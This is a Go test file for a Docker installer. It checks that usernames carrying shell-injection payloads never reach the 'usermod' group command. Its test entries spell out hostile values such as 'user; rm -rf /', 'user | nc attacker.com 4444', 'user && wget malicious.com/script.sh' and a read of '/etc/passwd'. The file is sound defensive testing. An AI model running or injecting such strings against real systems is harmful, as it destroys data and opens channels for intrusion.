package docker_test

import (
	"fmt"
	"strings"

	. "github.com/onsi/ginkgo/v2"
	. "github.com/onsi/gomega"

	"github.com/jameswlane/devex/pkg/installers/docker"
	"github.com/jameswlane/devex/pkg/mocks"
	"github.com/jameswlane/devex/pkg/utils"
)

var _ = Describe("Docker Installer Security Tests", func() {
	var (
		mockExec     *mocks.MockCommandExecutor
		mockRepo     *mocks.MockRepository
		installer    *docker.DockerInstaller
		originalExec utils.Interface
	)

	BeforeEach(func() {
		mockExec = &mocks.MockCommandExecutor{
			FailingCommands:   make(map[string]bool),
			Commands:          []string{},
			InstallationState: make(map[string]bool),
		}
		mockRepo = mocks.NewMockRepository()
		installer = docker.New()
		originalExec = utils.CommandExec
		utils.CommandExec = mockExec

		// Setup basic Docker availability
		// Force initial docker command to fail to trigger user group logic
		mockExec.FailingCommands["docker version --format '{{.Server.Version}}'"] = true
	})

	AfterEach(func() {
		utils.CommandExec = originalExec
	})

	Context("Username Validation Security", func() {
		DescribeTable("dangerous username patterns",
			func(username string, description string) {
				// Create a custom command executor that can simulate different usernames
				// Note: In practice, username comes from os/user.Current(), but we test the validation logic
				securityExec := &SecurityTestExecutor{
					MockCommandExecutor: &mocks.MockCommandExecutor{
						FailingCommands:   make(map[string]bool),
						Commands:          []string{},
						InstallationState: make(map[string]bool),
					},
					simulatedUsername: username,
					usermodCalled:     false,
				}

				// Setup Docker service availability checks
				securityExec.FailingCommands["docker version --format '{{.Server.Version}}'"] = true

				utils.CommandExec = securityExec

				// Execute Docker installation which may trigger user group management
				err := installer.Install("docker run --name test-container redis", mockRepo)
				Expect(err).ToNot(HaveOccurred())

				// Verify that dangerous usernames don't reach usermod command
				Expect(securityExec.usermodCalled).To(BeFalse(),
					"usermod should not be called with dangerous username: "+username)
			},
			Entry("username with semicolon", "user; rm -rf /", "Semicolon injection should be blocked"),
			Entry("username with pipe", "user | nc attacker.com", "Pipe injection should be blocked"),
			Entry("username with backticks", "user`whoami`", "Command substitution should be blocked"),
			Entry("username with dollar", "user$IFS$9", "Variable expansion should be blocked"),
			Entry("username with parentheses", "user(test)", "Subshell execution should be blocked"),
			Entry("username with brackets", "user[0]", "Glob patterns should be blocked"),
			Entry("username with braces", "user{cat,/etc/passwd}", "Brace expansion should be blocked"),
			Entry("username with asterisk", "user*", "Wildcard patterns should be blocked"),
			Entry("username with question mark", "user?", "Single char wildcards should be blocked"),
		)

		Context("Safe Username Handling", func() {
			DescribeTable("safe username patterns",
				func(username string, description string) {
					securityExec := &SecurityTestExecutor{
						MockCommandExecutor: &mocks.MockCommandExecutor{
							FailingCommands:   make(map[string]bool),
							Commands:          []string{},
							InstallationState: make(map[string]bool),
						},
						simulatedUsername: username,
						usermodCalled:     false,
					}

					// Setup Docker service availability checks
					securityExec.FailingCommands["docker version --format '{{.Server.Version}}'"] = true

					utils.CommandExec = securityExec

					err := installer.Install("docker run --name test-container redis", mockRepo)
					Expect(err).ToNot(HaveOccurred())

					// Safe usernames should be allowed (though usermod may not be called due to other factors)
					// The key is that the function completes without security warnings
				},
				Entry("alphanumeric username", "user123", "Alphanumeric usernames should be safe"),
				Entry("username with hyphen", "my-user", "Hyphens should be safe"),
				Entry("username with underscore", "test_user", "Underscores should be safe"),
				Entry("username with dot", "user.name", "Dots should be safe"),
			)
		})
	})

	Context("Command Injection Prevention", func() {
		It("should prevent command injection in usermod calls", func() {
			// Test that validates the specific security fix for username validation
			dangerousUsernames := []string{
				"user; rm -rf /",
				"user && wget malicious.com/script.sh",
				"user | nc attacker.com 4444",
			}

			for i, username := range dangerousUsernames {
				// Create a fresh mock repo for each test to avoid conflicts
				testRepo := mocks.NewMockRepository()
				securityExec := &SecurityTestExecutor{
					MockCommandExecutor: &mocks.MockCommandExecutor{
						FailingCommands:   make(map[string]bool),
						Commands:          []string{},
						InstallationState: make(map[string]bool),
					},
					simulatedUsername: username,
					usermodCalled:     false,
				}

				// Setup Docker service availability checks
				securityExec.FailingCommands["docker version --format '{{.Server.Version}}'"] = true

				utils.CommandExec = securityExec

				// Use unique container name for each test to avoid repository conflicts
				containerName := fmt.Sprintf("test-container-%d", i)
				command := fmt.Sprintf("docker run --name %s redis", containerName)
				err := installer.Install(command, testRepo)
				Expect(err).ToNot(HaveOccurred())

				// Verify that no usermod command was executed with dangerous username
				Expect(securityExec.usermodCalled).To(BeFalse(),
					"Command injection attempt should be blocked for username: "+username)
			}
		})
	})

	Context("Security Regression Prevention", func() {
		It("should always validate usernames before usermod execution", func() {
			// This test ensures username validation is consistently applied
			// Create a fresh mock repo for this test to avoid conflicts
			testRepo := mocks.NewMockRepository()
			securityExec := &SecurityTestExecutor{
				MockCommandExecutor: &mocks.MockCommandExecutor{
					FailingCommands:   make(map[string]bool),
					Commands:          []string{},
					InstallationState: make(map[string]bool),
				},
				simulatedUsername: "malicious;rm -rf /",
				usermodCalled:     false,
			}

			// Setup Docker service availability checks
			securityExec.FailingCommands["docker version --format '{{.Server.Version}}'"] = true

			utils.CommandExec = securityExec

			err := installer.Install("docker run --name test-regression-container redis", testRepo)
			Expect(err).ToNot(HaveOccurred())

			// The malicious username should never reach usermod
			Expect(securityExec.usermodCalled).To(BeFalse(),
				"Username validation should prevent dangerous usermod execution")
		})
	})
})

// SecurityTestExecutor wraps MockCommandExecutor to simulate username validation scenarios
type SecurityTestExecutor struct {
	*mocks.MockCommandExecutor
	simulatedUsername string
	usermodCalled     bool
}

func (s *SecurityTestExecutor) RunShellCommand(command string) (string, error) {
	// Track if usermod is called with our simulated username
	if strings.Contains(command, "sudo usermod -aG docker") && strings.Contains(command, s.simulatedUsername) {
		s.usermodCalled = true
	}

	// Call the original mock implementation
	return s.MockCommandExecutor.RunShellCommand(command)
}
